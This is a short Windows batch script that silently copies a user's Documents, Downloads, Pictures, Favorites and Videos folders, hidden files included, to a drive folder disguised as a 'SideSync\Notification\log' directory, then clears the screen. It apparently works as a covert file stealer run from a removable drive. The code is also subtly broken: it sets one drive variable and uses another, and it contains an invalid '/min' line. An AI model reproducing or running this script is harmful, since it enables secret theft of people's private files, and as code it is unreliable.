@echo off
:: variables
/min
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /s /c /d /e /h /i /r /y
echo off
%backupcmd% "%USERPROFILE%\Documents" "%drive%\Documentos\SideSync\Notification\log\Documents"
%backupcmd% "%USERPROFILE%\Downloads" "%drive%\Documentos\SideSync\Notification\log\Downloads"
%backupcmd% "%USERPROFILE%\pictures" "%drive%\Documentos\SideSync\Notification\log\My pics"
%backupcmd% "%USERPROFILE%\Favorites" "%drive%\Documentos\SideSync\Notification\log\Favorites"
%backupcmd% "%USERPROFILE%\videos" "%drive%\Documentos\SideSync\Notification\log\videos"
@echo off 
cls